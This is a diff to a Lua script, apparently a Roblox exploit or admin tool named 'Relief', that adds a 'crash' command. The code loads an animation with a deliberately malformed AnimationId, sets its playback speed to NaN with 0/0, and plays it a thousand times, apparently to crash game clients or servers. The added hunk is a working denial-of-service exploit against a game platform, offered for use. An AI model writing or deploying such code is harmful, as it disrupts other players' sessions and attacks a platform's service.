@@ -1446,6 +1446,26 @@ Relief.AddCommand({"unfriendspam", "unfs"}, function(Args)
 	Thread:Disconnect("FriendSpam")
 end)
 
+Relief.AddCommand({"crash"}, function(Args)
+	local Char = LocalPlayer.Character
+	if not Char then return Relief.Notify("No character.", 3) end
+
+	local Hum = Char:FindFirstChildOfClass("Humanoid")
+	if not Hum then return Relief.Notify("No humanoid.", 3) end
+
+	local Anim = Instance.new("Animation")
+	Anim.AnimationId = (
+		"http{%s}\n=108547486427358=128564458016055=111133097645102=118859282718860=116688450587693=108713182294229"
+	):format(HttpService:GenerateGUID(false):lower())
+
+	local Track = Hum:LoadAnimation(Anim)
+	Track:AdjustSpeed(0/0)
+	
+	for i = 1, 1000 do
+		Track:Play()
+	end
+end)
+
 -- Loader
 
 if Found then toLoad() end
